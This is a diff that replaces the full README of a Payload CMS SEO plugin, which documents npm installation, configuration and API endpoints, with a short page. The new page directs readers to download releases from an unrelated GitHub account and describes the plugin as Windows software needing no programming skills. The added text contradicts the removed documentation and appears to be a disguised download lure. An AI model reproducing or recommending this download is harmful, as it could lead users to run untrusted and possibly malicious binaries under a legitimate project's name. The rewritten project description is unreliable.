@@ -1,1119 +1,161 @@
-<!-- Header Banner -->
-<div align="center">
-
-  <a href="https://git.io/typing-svg">
-    <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=32&duration=3000&pause=1000&color=3B82F6&center=true&vCenter=true&width=700&lines=%40consilioweb%2Fseo-analyzer;Payload+CMS+SEO+Plugin;50%2B+Checks+%7C+39+Languages;Admin+Dashboard+Suite+%7C+FR+%26+EN" alt="Typing SVG" />
-  </a>
-
-  <br><br>
-
-  <!-- Badges -->
-  <a href="https://www.npmjs.com/package/@consilioweb/seo-analyzer"><img src="https://img.shields.io/npm/v/@consilioweb/seo-analyzer?style=for-the-badge&logo=npm&logoColor=white&color=CB3837" alt="npm version"></a>
-  <a href="https://www.npmjs.com/package/@consilioweb/seo-analyzer"><img src="https://img.shields.io/npm/dw/@consilioweb/seo-analyzer?style=for-the-badge&logo=npm&logoColor=white&color=CB3837" alt="npm downloads"></a>
-  <img src="https://img.shields.io/badge/Payload%20CMS-3.x-0F172A?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTIgMkw0IDdWMTdMMTIgMjJMMjAgMTdWN0wxMiAyWiIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz48L3N2Zz4=&logoColor=white" alt="Payload CMS 3">
-  <img src="https://img.shields.io/badge/SEO-50%2B%20Checks-10B981?style=for-the-badge" alt="50+ Checks">
-  <img src="https://img.shields.io/badge/i18n-39%20Languages-3B82F6?style=for-the-badge" alt="i18n 39 Languages">
-  <a href="https://github.com/pOwn3d/payload-seo-analyzer/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-7C3AED?style=for-the-badge" alt="MIT License"></a>
-  <img src="https://img.shields.io/badge/TypeScript-5.x-3178C6?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript">
-  <a href="https://github.com/pOwn3d/payload-seo-analyzer/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/pOwn3d/payload-seo-analyzer/ci.yml?branch=main&style=for-the-badge&logo=github-actions&logoColor=white" alt="CI"></a>
-  <a href="https://github.com/pOwn3d/payload-seo-analyzer"><img src="https://img.shields.io/github/stars/pOwn3d/payload-seo-analyzer?style=for-the-badge&logo=github&color=181717" alt="GitHub stars"></a>
-
-</div>
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## About
-
-> **@consilioweb/seo-analyzer** — A comprehensive SEO analysis plugin for Payload CMS 3 with 50+ checks, bilingual readability scoring (French & English), native Lexical JSON support, a full admin dashboard suite with auto-locale detection, and meta field labels in 39 languages.
-
-<table>
-  <tr>
-    <td align="center" width="25%">
-      <img src="https://img.icons8.com/color/96/seo.png" width="50"/><br>
-      <b>50+ SEO Checks</b><br>
-      <sub>17 rule groups</sub>
-    </td>
-    <td align="center" width="25%">
-      <img src="https://img.icons8.com/color/96/dashboard-layout.png" width="50"/><br>
-      <b>9 Admin Views</b><br>
-      <sub>Full dashboard suite</sub>
-    </td>
-    <td align="center" width="25%">
-      <img src="https://img.icons8.com/color/96/translation.png" width="50"/><br>
-      <b>i18n 39 Languages</b><br>
-      <sub>Meta fields UI + FR/EN dashboard</sub>
-    </td>
-    <td align="center" width="25%">
-      <img src="https://img.icons8.com/color/96/api-settings.png" width="50"/><br>
-      <b>20+ Endpoints</b><br>
-      <sub>REST API</sub>
-    </td>
-  </tr>
-</table>
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Overview
-
-`@consilioweb/seo-analyzer` adds a complete SEO toolkit directly into your Payload CMS admin panel. It runs **50+ on-page SEO checks** in real time as editors write content, with **bilingual support (French & English)** — locale-adapted readability formulas (Kandel-Moles FR / Flesch-Kincaid EN), passive voice detection, transition words, and all SEO messages — plus **native parsing of Payload's Lexical rich text** format.
-
-The plugin provides **9 dedicated admin views**, **5 auto-managed collections**, **20+ API endpoints**, and automatic behaviors like slug-change redirect creation and score history tracking — all configured through a single plugin call. The admin dashboard **automatically adapts to the user's Payload locale** (FR/EN), and meta field UI labels support **39 languages** via Payload's native i18n system.
-
-### Screenshots
-
-| SEO Dashboard | Sitemap Audit |
-|:---:|:---:|
-| ![SEO Dashboard](https://raw.githubusercontent.com/pOwn3d/payload-seo-analyzer/main/docs/screenshots/seo-dashboard.png) | ![Sitemap Audit](https://raw.githubusercontent.com/pOwn3d/payload-seo-analyzer/main/docs/screenshots/sitemap-audit.png) |
-
-| Editor Sidebar | Configuration |
-|:---:|:---:|
-| ![Editor Sidebar](https://raw.githubusercontent.com/pOwn3d/payload-seo-analyzer/main/docs/screenshots/editor-sidebar.png) | ![Configuration](https://raw.githubusercontent.com/pOwn3d/payload-seo-analyzer/main/docs/screenshots/seo-config.png) |
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Table of Contents
-
-- [Features](#features)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Internationalization (i18n)](#internationalization-i18n)
-- [Configuration](#configuration)
-- [Admin Views](#admin-views)
-- [API Endpoints](#api-endpoints)
-- [SEO Rules Reference](#seo-rules-reference)
-- [Collections](#collections)
-- [Fields Added to Collections](#fields-added-to-collections)
-- [Programmatic Usage](#programmatic-usage)
-- [Page Type Detection](#page-type-detection)
-- [Package Exports](#package-exports)
-- [Requirements](#requirements)
-- [Uninstall](#uninstall)
-- [License](#license)
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Features
-
-### SEO Analysis Engine (50+ Checks)
-
-The core analyzer runs **17 rule groups** covering every aspect of on-page SEO:
-
-- **Title** — length (30-60 chars), keyword presence and position, duplicate brand detection, power words, numbers, questions, emotional words
-- **Meta Description** — length (120-160 chars), keyword presence, call-to-action verbs
-- **URL / Slug** — length, format validation, keyword presence, French stop word detection
-- **Headings** — unique H1, keyword in H1/H2, heading hierarchy, H1 vs title differentiation, heading frequency
-- **Content** — word count by page type, keyword in introduction, keyword density (0.5%-2.5%), placeholder detection, thin content, keyword distribution across content tiers, list detection
-- **Images** — alt text coverage (80%+ threshold), keyword in alt, image presence and quantity
-- **Linking** — internal links (3+ recommended), external links, generic anchor detection, empty link detection
-- **Social** — OG image, title truncation on social platforms, description length for Facebook/LinkedIn
-- **Schema** — structured data readiness (title + description + image)
-- **Readability** — Flesch FR score, long sentences, long paragraphs, passive voice, transition words, consecutive same-start sentences, long sections without subheadings
-- **Quality** — duplicate/placeholder content detection, substantial content validation
-- **Secondary Keywords** — presence in title, description, content, and H2/H3 headings (up to 3 secondary keywords)
-- **Cornerstone** — enhanced checks for pillar content (1500+ words, 5+ internal links, mandatory keyword)
-- **Freshness** — content age tracking, review dates, year references, thin content aging penalty
-- **Technical** — canonical URL validation, robots meta directives (noindex/nofollow)
-- **Accessibility** — short anchors, alt text quality, empty headings, duplicate adjacent links, all-caps headings, link density ratio, camera filename detection, alt-heading redundancy
-- **E-commerce** — price detection, product description length, image count, brand in title, price in meta, review readiness, availability status
-
-### Bilingual Readability (FR & EN)
-
-Locale-adapted readability analysis with different formulas and thresholds per language:
-
-| Check | French (Kandel-Moles) | English (Flesch-Kincaid) |
-|-------|----------------------|--------------------------|
-| Flesch pass | >= 40 | >= 60 |
-| Flesch warning | >= 25 | >= 40 |
-| Long sentences | > 25 words | > 20 words |
-| Passive voice max | 15% | 10% |
-| Transition words min | 15% | 20% |
-
-**French** uses the Kandel-Moles coefficients (lower thresholds due to longer words: `-tion`, `-ment`, `-ité`), French passive voice detection (excludes passé composé with être-verbs), and 72 French transition words.
-
-**English** uses the standard Flesch-Kincaid formula, English passive voice detection (be-verb + past participle), and 65 English transition words.
-
-### Native Lexical JSON Support
-
-Natively parses Payload CMS Lexical rich text JSON structures with:
-
-- Recursive text extraction (configurable max depth, default: 50)
-- Heading extraction with tag and text
-- Link extraction (internal/external) with anchor text
-- Image extraction with alt text analysis
-- List detection (ordered/unordered) for featured snippet optimization
-- Support for nested blocks, columns, and all standard Payload block types
+# 🚀 payload-seo-analyzer - SEO Checks Made Simple
 
-### Admin Dashboard Suite (9 Views — FR/EN auto-locale)
-
-All dashboard views automatically switch to the user's Payload admin locale (French or English). No configuration needed — the plugin detects `useLocale()` from `@payloadcms/ui` and adapts all labels, messages, dates, and UI strings accordingly.
-
-| View | Path | Description |
-|------|------|-------------|
-| **SEO Dashboard** | `/admin/seo` | Sortable table of all pages/posts with scores, inline editing, bulk actions, filters |
-| **Sitemap Audit** | `/admin/sitemap-audit` | Orphan pages, weak pages, broken internal links, hub detection, link graph analysis |
-| **SEO Configuration** | `/admin/seo-config` | Site name, ignored slugs, disabled rules, custom thresholds, sitemap and breadcrumb settings |
-| **Redirect Manager** | `/admin/redirects` | Full CRUD for 301/302 redirects with CSV import, test tool, and bulk operations |
-| **Cannibalization** | `/admin/cannibalization` | Detect keyword cannibalization across pages sharing the same focus keyword |
-| **Performance** | `/admin/performance` | Google Search Console data import (CSV/XLSX), trend charts, position tracking |
-| **Keyword Research** | `/admin/keyword-research` | Keyword suggestions based on existing content, gap analysis |
-| **Schema Builder** | `/admin/schema-builder` | Visual JSON-LD schema.org structured data generation |
-| **Link Graph** | `/admin/link-graph` | Internal link structure visualization with hub and orphan detection |
-
-### Editor Sidebar Components
-
-- **SeoAnalyzer** — Real-time SEO scoring widget in the document editor sidebar with pass/warning/fail indicators, actionable tips, and grouped checks
-- **Score History Chart** — Inline score trend visualization over time
-- **Content Decay Section** — Freshness and aging indicators
-- **Social Preview** — Facebook and Twitter card preview
-
-### Automatic Behaviors
-
-- **Auto-redirect on slug change** — Creates a 301 redirect when a document's slug is modified (with redirect chain detection)
-- **Score history tracking** — Records SEO score snapshots on every document save via afterChange hook
-- **Cache warm-up** — Pre-loads collection data on startup and hourly for instant dashboard response
-- **SEO Logs (404 monitoring)** — Tracks 404 errors with hit count, referrer, and user agent for proactive redirect management
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Installation
-
-```bash
-pnpm add @consilioweb/seo-analyzer
-```
-
-Or with npm/yarn:
+[![Download payload-seo-analyzer](https://img.shields.io/badge/Download-Payload_SEO_Analyzer-brightgreen?style=for-the-badge)](https://github.com/youssefabdelrhim300-coder/payload-seo-analyzer/releases)
 
-```bash
-npm install @consilioweb/seo-analyzer
-yarn add @consilioweb/seo-analyzer
-```
+---
 
-### Peer Dependencies
+## 🔍 What is payload-seo-analyzer?
 
-The plugin requires Payload CMS 3.x. The following peer dependencies are optional but recommended for full admin UI features:
+payload-seo-analyzer is a tool designed to help you check and improve your website’s SEO. It works with Payload CMS 3 and runs many tests to give clear feedback on your site's SEO health. The plugin offers over 50 checks, including French readability scores, sitemap audit, performance tracking, and support for structured data.
 
-| Package | Version | Required |
-|---------|---------|----------|
-| `payload` | `^3.0.0` | **Yes** |
-| `@payloadcms/next` | `^3.0.0` | Optional (admin views) |
-| `@payloadcms/ui` | `^3.0.0` | Optional (admin UI) |
-| `react` | `^18.0.0 \|\| ^19.0.0` | Optional (admin UI) |
+This software helps you:
 
-> **Note:** For XLSX import in the Performance view, install `xlsx` separately (`pnpm add xlsx`). It is loaded dynamically and not required as a peer dependency.
+- Check meta tags and redirects
+- Measure content readability in French
+- Review your sitemap for errors
+- Track site performance related to SEO
+- See detailed reports via nine easy admin views
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
+You do not need programming skills. The software runs on Windows and guides you through each step clearly.
 
-## Quick Start
+---
 
-Add the plugin to your `payload.config.ts`:
+## 🖥️ System Requirements
 
-```ts
-import { buildConfig } from 'payload'
-import { seoAnalyzerPlugin } from '@consilioweb/seo-analyzer'
+To use payload-seo-analyzer on Windows, make sure your computer meets these requirements:
 
-export default buildConfig({
-  // ... your existing config
-  plugins: [
-    seoAnalyzerPlugin({
-      collections: ['pages', 'posts'],
-    }),
-  ],
-})
-```
+- Windows 10 or newer
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection to download and update the plugin
+- A web browser (Chrome, Edge, or Firefox recommended)
 
-> **Using alongside `@payloadcms/plugin-seo`?** The export is named `seoAnalyzerPlugin` (not `seoPlugin`) specifically to avoid naming conflicts with the official Payload SEO plugin. If both plugins target the same collections, a warning will be logged at startup to help you avoid duplicate SEO fields. You can safely use both plugins together — just make sure they target different collections, or accept the overlap if intentional.
->
-> The legacy import `import { seoPlugin } from '@consilioweb/seo-analyzer'` still works for backward compatibility.
-
-That's it. The plugin will automatically:
-
-1. Add SEO fields (`focusKeyword`, `focusKeywords`, `isCornerstone`) and the SeoAnalyzer sidebar widget to the specified collections
-2. Auto-create meta fields (`meta.title`, `meta.description`, `meta.image`) with SERP preview — unless `@payloadcms/plugin-seo` is already handling them
-3. Create 5 managed collections for score history, performance data, settings, redirects, and 404 logs
-4. Register 20+ API endpoints under `/api/seo-plugin/`
-5. Add 9 admin views with a collapsible navigation group
-6. Attach `beforeChange` (auto-redirect) and `afterChange` (score tracking) hooks to target collections and globals
-7. Inject meta field translations (39 languages) into Payload's i18n system
-8. Start background cache warm-up on server init
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Internationalization (i18n)
-
-The plugin has **three layers of internationalization**:
-
-| Layer | Languages | What it covers |
-|-------|-----------|----------------|
-| **SEO Analysis Engine** | FR, EN | 50+ check messages, tips, readability formulas, linguistic analysis |
-| **Admin Dashboard** | FR, EN | All 9 dashboard views, sidebar components, navigation labels (~500 strings) |
-| **Meta Field UI Labels** | 39 languages | Field labels, descriptions, and generate buttons in the Payload admin |
-
-### 1. SEO Analysis Locale
-
-Controls the language of SEO check messages and linguistic analysis via the `locale` option:
-
-```ts
-seoAnalyzerPlugin({
-  collections: ['pages', 'posts'],
-  locale: 'en', // 'fr' (default) | 'en'
-})
-```
-
-| Feature | `locale: 'fr'` (default) | `locale: 'en'` |
-|---------|--------------------------|-----------------|
-| SEO messages & tips | French | English |
-| Readability formula | Kandel-Moles (FR thresholds) | Flesch-Kincaid (EN thresholds) |
-| Passive voice detection | être + participe passé | be-verb + past participle |
-| Transition words | 72 French expressions | 65 English expressions |
-| Stop words in slug | French stop words | English stop words |
-| Action verbs (CTA) | 30 French verbs | 30 English verbs |
-| Power words | 29 French words | 30 English words |
-| Page type detection | FR slugs (`mentions-legales`, `contact`) | EN slugs (`privacy-policy`, `contact-us`) |
-| Question words (title) | `comment`, `pourquoi`, `quand`... | `how`, `why`, `when`... |
-
-### 2. Dashboard Auto-Locale (FR/EN)
-
-The admin dashboard **automatically adapts** to the Payload user's locale — no configuration needed. When the admin switches their UI language in Payload (e.g. via the locale selector), all dashboard labels, messages, dates, and UI strings switch instantly.
-
-This works via `useLocale()` from `@payloadcms/ui`. Any locale starting with `en` maps to English; all others default to French.
-
-**Covered components:** SEO Dashboard, Sitemap Audit, SEO Config, Redirect Manager, Cannibalization, Performance, Keyword Research, Schema Builder, Link Graph, SeoAnalyzer sidebar, Score History, Content Decay, Social Preview, SERP Preview, Meta fields (title, description, image, overview).
-
-### 3. Meta Field Labels (39 Languages)
-
-The plugin injects translations for meta field UI labels (title, description, image, overview, SERP preview) into Payload's native i18n system. These are auto-loaded — no configuration needed.
-
-Supported languages: Arabic, Azerbaijani, Bulgarian, Catalan, Czech, German, English, Spanish, Estonian, Farsi, Finnish, French, Hebrew, Croatian, Hungarian, Indonesian, Italian, Japanese, Korean, Malay, Norwegian, Dutch, Polish, Portuguese, Romanian, Russian, Slovak, Slovenian, Swedish, Thai, Turkish, Ukrainian, Vietnamese, Chinese (Simplified & Traditional), Bengali, Greek, Latvian, Serbian.
-
-### Backward Compatibility
-
-The `locale` option defaults to `'fr'` — existing installations are unaffected. All legacy exports (`calculateFleschFR`, `getStopWordsFR`, `POWER_WORDS_FR`, etc.) remain available as aliases.
-
-### Programmatic Usage with Locale
-
-```ts
-import { analyzeSeo } from '@consilioweb/seo-analyzer'
-
-const result = analyzeSeo(input, { locale: 'en' })
-// All messages returned in English, EN readability thresholds applied
-```
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Configuration
-
-### `SeoPluginConfig`
-
-```ts
-seoAnalyzerPlugin({
-  // All options are optional — sensible defaults are used
-  collections: ['pages', 'posts'],
-  globals: [],
-  locale: 'fr',
-  tabbedUI: false,
-  autoCreateMetaFields: true,
-  uploadsCollection: 'media',
-  generateTitle: undefined,
-  generateDescription: undefined,
-  generateImage: undefined,
-  generateURL: undefined,
-  fields: undefined,
-  localeMapping: undefined,
-  addDashboardView: true,
-  addSitemapAuditView: true,
-  disabledRules: [],
-  overrideWeights: {},
-  thresholds: {},
-  localSeoSlugs: [],
-  siteName: undefined,
-  endpointBasePath: '/seo-plugin',
-  trackScoreHistory: true,
-  redirectsCollection: 'seo-redirects',
-  knownRoutes: [],
-  seoLogsSecret: undefined,
-})
-```
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `collections` | `string[]` | `['pages', 'posts']` | Collections to add SEO fields and hooks to |
-| `globals` | `string[]` | `[]` | Globals to add SEO fields and hooks to |
-| `locale` | `'fr' \| 'en'` | `'fr'` | Language for SEO messages, readability analysis, and linguistic checks |
-| `tabbedUI` | `boolean` | `false` | Wrap collection/global fields in "Content" + "SEO" tabs |
-| `autoCreateMetaFields` | `boolean` | `true` | Auto-create meta fields (title, description, image) if `@payloadcms/plugin-seo` is not detected |
-| `uploadsCollection` | `string` | `'media'` | Collection slug for the meta image upload field |
-| `generateTitle` | `function` | `undefined` | Custom function to generate meta title |
-| `generateDescription` | `function` | `undefined` | Custom function to generate meta description |
-| `generateImage` | `function` | `undefined` | Custom function to generate meta image |
-| `generateURL` | `function` | `undefined` | Custom function to generate page URL for SERP preview |
-| `fields` | `function` | `undefined` | Override default meta fields: `({ defaultFields }) => Field[]` |
-| `localeMapping` | `Record<string, 'fr' \| 'en'>` | `undefined` | Map Payload locale codes to analysis locale (e.g. `{ 'fr-FR': 'fr', 'en-US': 'en' }`) |
-| `addDashboardView` | `boolean` | `true` | Register the SEO dashboard and all admin views |
-| `addSitemapAuditView` | `boolean` | `true` | Register the sitemap audit view |
-| `disabledRules` | `RuleGroup[]` | `[]` | Rule groups to skip entirely during analysis |
-| `overrideWeights` | `Partial<Record<RuleGroup, number>>` | `{}` | Override the weight of all checks in a rule group |
-| `thresholds` | `SeoThresholds` | See below | Custom thresholds for analysis checks |
-| `localSeoSlugs` | `string[]` | `[]` | Additional slugs recognized as local SEO pages |
-| `siteName` | `string` | `undefined` | Site name for brand duplicate detection in titles |
-| `endpointBasePath` | `string` | `'/seo-plugin'` | Base path prefix for all API endpoints |
-| `trackScoreHistory` | `boolean` | `true` | Enable score history collection and afterChange tracking hook |
-| `redirectsCollection` | `string` | `'seo-redirects'` | Slug for the auto-created redirects collection |
-| `knownRoutes` | `string[]` | `[]` | Dynamic routes that should not be flagged as broken links |
-| `seoLogsSecret` | `string` | `undefined` | Shared secret for the SEO logs POST endpoint (middleware auth) |
-
-### `SeoThresholds`
-
-All thresholds are optional. Defaults are used when omitted.
-
-| Threshold | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `titleLengthMin` | `number` | `30` | Minimum meta title length (characters) |
-| `titleLengthMax` | `number` | `60` | Maximum meta title length (characters) |
-| `metaDescLengthMin` | `number` | `120` | Minimum meta description length |
-| `metaDescLengthMax` | `number` | `160` | Maximum meta description length |
-| `minWordsGeneric` | `number` | `300` | Minimum word count for generic pages |
-| `minWordsPost` | `number` | `800` | Minimum word count for blog posts |
-| `keywordDensityMin` | `number` | `0.5` | Minimum keyword density (%) |
-| `keywordDensityMax` | `number` | `3` | Maximum keyword density (%) |
-| `fleschScorePass` | `number` | `40` | Flesch FR passing score threshold |
-| `slugMaxLength` | `number` | `75` | Maximum slug length (characters) |
-
-### `RuleGroup` Values
-
-```ts
-type RuleGroup =
-  | 'title'
-  | 'meta-description'
-  | 'url'
-  | 'headings'
-  | 'content'
-  | 'images'
-  | 'linking'
-  | 'social'
-  | 'schema'
-  | 'readability'
-  | 'quality'
-  | 'secondary-keywords'
-  | 'cornerstone'
-  | 'freshness'
-  | 'technical'
-  | 'accessibility'
-  | 'ecommerce'
-```
-
-### Advanced Configuration Example
-
-```ts
-import { seoAnalyzerPlugin } from '@consilioweb/seo-analyzer'
-
-export default buildConfig({
-  plugins: [
-    seoAnalyzerPlugin({
-      collections: ['pages', 'posts', 'products'],
-      globals: ['header', 'footer'],
-      locale: 'en',
-      tabbedUI: true, // Wrap fields in Content + SEO tabs
-      siteName: 'My Website',
-      endpointBasePath: '/seo',
-      knownRoutes: ['blog', 'products', 'categories'],
-      localSeoSlugs: ['plumber-paris', 'plumber-lyon'],
-      disabledRules: ['social', 'schema'],
-      overrideWeights: {
-        readability: 1,
-        cornerstone: 5,
-      },
-      thresholds: {
-        titleLengthMax: 65,
-        minWordsPost: 1000,
-        fleschScorePass: 35,
-      },
-      // Generate functions (called by the "Generate" buttons in meta fields)
-      generateTitle: ({ doc }) => `${(doc as any).title} | My Website`,
-      generateDescription: ({ doc }) => `Discover ${(doc as any).title} on My Website.`,
-      generateURL: ({ doc }) => `https://mywebsite.com/${(doc as any).slug || ''}`,
-      // Custom meta fields layout
-      fields: ({ defaultFields }) => [
-        ...defaultFields,
-        { name: 'canonicalUrl', type: 'text', label: 'Canonical URL' },
-      ],
-      // Map Payload locales to analysis language
-      localeMapping: { 'fr-FR': 'fr', 'en-US': 'en' },
-      seoLogsSecret: process.env.SEO_LOGS_SECRET,
-    }),
-  ],
-})
-```
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## Admin Views
-
-### SEO Dashboard (`/admin/seo`)
-
-The main dashboard displays a sortable, filterable table of all pages and posts with their SEO scores. Features include:
-
-- Color-coded score badges (excellent/good/ok/poor)
-- Sortable columns: score, title, word count, focus keyword, H1, OG image, links, readability
-- Quick filters: missing meta, missing H1, low readability
-- Inline editing of meta title and description
-- Bulk actions: export CSV, mark/unmark cornerstone
-- Checkboxes for multi-selection
-- Score trend indicators (up/down arrows)
-- Multi-keyword display
-- Quick links to edit each document
-
-### Sitemap Audit (`/admin/sitemap-audit`)
-
-Analyzes your site's internal structure to identify:
-
-- **Orphan pages** — pages with no internal links pointing to them
-- **Weak pages** — pages with few incoming links (with anchor text display)
-- **Broken internal links** — links pointing to non-existent pages (with fix suggestions)
-- **Hub pages** — pages with the most outgoing internal links
-- **One-click 301 redirect creation** for broken links
-- **SEO scores** alongside orphan and weak pages
-- **Hover previews** with contextual information
-- **Export** — JSON and CSV download of the full link graph
-
-### SEO Configuration (`/admin/seo-config`)
-
-Centralized settings management:
-
-- Site name (for brand duplicate detection)
-- Ignored slugs (excluded from audits)
-- Disabled rule groups
-- Custom thresholds (title length, word counts, etc.)
-- Sitemap configuration (excluded slugs, change frequency, priority overrides)
-- Breadcrumb configuration (separator, home label, display options)
-
-### Redirect Manager (`/admin/redirects`)
-
-Full redirect management with:
-
-- CRUD operations for 301/302 redirects
-- CSV import for bulk redirect creation
-- Redirect test tool (verify where a URL redirects)
-- Bulk delete operations
-
-### Cannibalization Detection (`/admin/cannibalization`)
-
-Identifies pages competing for the same keywords by detecting documents that share identical focus keywords.
-
-### Performance Tracking (`/admin/performance`)
-
-Import and visualize Google Search Console data:
-
-- CSV and XLSX file import (supports French GSC headers)
-- Click, impression, CTR, and position tracking
-- Trend visualization over time
-- Per-URL and per-query breakdowns
-
-### Keyword Research (`/admin/keyword-research`)
-
-Keyword analysis based on your existing content:
-
-- Keyword suggestions derived from current pages
-- Gap analysis to identify missing keyword coverage
-
-### Schema Builder (`/admin/schema-builder`)
-
-Visual tool for generating JSON-LD structured data (schema.org) markup for your pages.
-
-### Link Graph (`/admin/link-graph`)
-
-Interactive visualization of your site's internal linking structure:
-
-- Node-based graph representation
-- Hub and orphan page identification
-- Link equity flow analysis
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## API Endpoints
-
-All endpoints are prefixed with the configured `endpointBasePath` (default: `/seo-plugin`). All endpoints require an authenticated admin user unless noted otherwise.
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` `POST` | `/validate` | Run SEO analysis on a document |
-| `GET` | `/check-keyword` | Check for keyword duplication across collections |
-| `GET` | `/audit` | Full site-wide SEO audit |
-| `GET` | `/history` | Score history data for trend charts |
-| `GET` | `/sitemap-audit` | Sitemap structure audit |
-| `GET` `PATCH` | `/settings` | Read or update SEO settings |
-| `POST` | `/suggest-links` | Internal link suggestions for a page |
-| `POST` | `/create-redirect` | Create a single redirect entry |
-| `GET` `POST` `PATCH` `DELETE` | `/redirects` | Full CRUD for redirect management |
-| `POST` | `/ai-generate` | AI-powered meta title/description generation |
-| `GET` | `/cannibalization` | Detect keyword cannibalization |
-| `POST` | `/external-links` | Check external link status (live HTTP checks with SSRF protection) |
-| `GET` | `/sitemap-config` | Sitemap configuration data |
-| `GET` `POST` | `/performance` | Read or import performance data (CSV/XLSX) |
-| `GET` | `/keyword-research` | Keyword suggestions and gap analysis |
-| `GET` | `/breadcrumb` | Breadcrumb configuration and data |
-| `GET` | `/link-graph` | Internal link graph data |
-| `GET` `POST` `DELETE` | `/seo-logs` | 404 log management (POST supports secret-header auth) |
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="line">
-
-## SEO Rules Reference
-
-### Scoring Algorithm
-
-Each check has a **weight** (1-5) and produces a **status** (`pass`, `warning`, or `fail`):
-
-- **Pass** — earns 100% of weight points
-- **Warning** — earns 50% of weight points
-- **Fail** — earns 0 points
-
-**Final score** = `round(earnedPoints / maxPoints * 100)`
-
-| Level | Score Range |
-|-------|-------------|
-| Excellent | >= 91 |
-| Good | >= 71 |
-| OK | >= 41 |
-| Poor | < 41 |
-
-### Complete Check List
-
-<details>
-<summary><strong>Title (9 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `title-missing` | 3 | Critical | Meta title is present |
-| `title-length` | 3 | Critical | Title between 30-60 characters |
-| `title-keyword` | 3 | Critical | Focus keyword in title |
-| `title-keyword-position` | 2 | Important | Keyword in first half of title |
-| `title-duplicate-brand` | 2 | Important | No duplicate brand name |
-| `title-power-words` | 1 | Bonus | Contains power words |
-| `title-has-number` | 1 | Bonus | Contains a number (+36% CTR) |
-| `title-is-question` | 1 | Bonus | Question format (Featured Snippet friendly) |
-| `title-sentiment` | 1 | Bonus | Contains emotional words |
-
-</details>
-
-<details>
-<summary><strong>Meta Description (4 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `meta-desc-missing` | 3 | Critical | Meta description is present |
-| `meta-desc-length` | 3 | Critical | Length between 120-160 characters |
-| `meta-desc-keyword` | 3 | Critical | Focus keyword in description |
-| `meta-desc-cta` | 2 | Important | Contains action verb or CTA pattern |
-
-</details>
-
-<details>
-<summary><strong>URL / Slug (5 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `slug-missing` | 2 | Important | Slug is defined |
-| `slug-length` | 2 | Important | Slug under 75 characters |
-| `slug-format` | 2 | Important | Lowercase, no special characters |
-| `slug-keyword` | 2 | Important | Focus keyword in slug |
-| `slug-stopwords` | 1 | Bonus | No stop words (FR or EN based on locale) |
-
-</details>
-
-<details>
-<summary><strong>Headings (6 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `h1-missing` / `h1-unique` | 2 | Important | Exactly one H1 per page |
-| `h1-keyword` | 2 | Important | Keyword in H1 |
-| `heading-hierarchy` | 2 | Important | Proper heading hierarchy (no level skip) |
-| `h2-keyword` | 2 | Important | Keyword in at least one H2 |
-| `heading-frequency` | 1 | Bonus | One subheading every ~300 words |
-| `h1-title-different` | 1 | Important | H1 differs from meta title |
-
-</details>
-
-<details>
-<summary><strong>Content (7 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `content-wordcount` | 2 | Important | Meets minimum word count by page type |
-| `content-keyword-intro` | 2 | Important | Keyword in first paragraph |
-| `content-keyword-density` | 2-3 | Important/Critical | Density between 0.5%-2.5% |
-| `content-no-placeholder` | 3 | Critical | No lorem ipsum, TODO, or placeholders |
-| `content-thin` | 2 | Important | Not thin content (>100 words) |
-| `content-keyword-distribution` | 2 | Important | Keyword in 2+ of 3 content tiers |
-| `content-has-lists` | 1 | Bonus | Contains ordered/unordered lists |
-
-</details>
-
-<details>
-<summary><strong>Images (4 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `images-alt` | 2 | Important | Alt text on 80%+ of images |
-| `images-alt-keyword` | 1 | Bonus | Keyword in at least one alt text |
-| `images-present` | 2 | Important | At least one image |
-| `images-quantity` | 1-2 | Bonus/Important | Multiple images for posts |
-
-</details>
-
-<details>
-<summary><strong>Linking (4 checks)</strong></summary>
-
-| Check ID | Weight | Category | Description |
-|----------|--------|----------|-------------|
-| `linking-internal` | 2 | Important | At least one internal link (3+ ideal) |
